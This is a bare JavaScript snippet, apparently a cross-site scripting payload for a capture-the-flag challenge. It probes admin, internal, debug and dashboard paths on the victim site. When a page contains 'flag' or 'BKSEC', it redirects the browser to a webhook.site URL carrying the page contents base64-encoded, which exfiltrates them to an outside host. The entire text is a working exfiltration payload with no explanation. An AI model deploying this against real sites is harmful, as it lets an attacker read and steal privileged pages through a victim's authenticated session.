(async()=>{
let p=["/","/admin","/dashboard","/security","/internal","/debug","/reports","/security-dashboard","/admin-panel"];
for(let x of p){
 try{
  let r=await fetch(x);
  let t=await r.text();
  if(t.includes("flag")||t.includes("BKSEC")){
   location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89?d="+btoa(t);
   break;
  }
 }catch(e){}
}
})();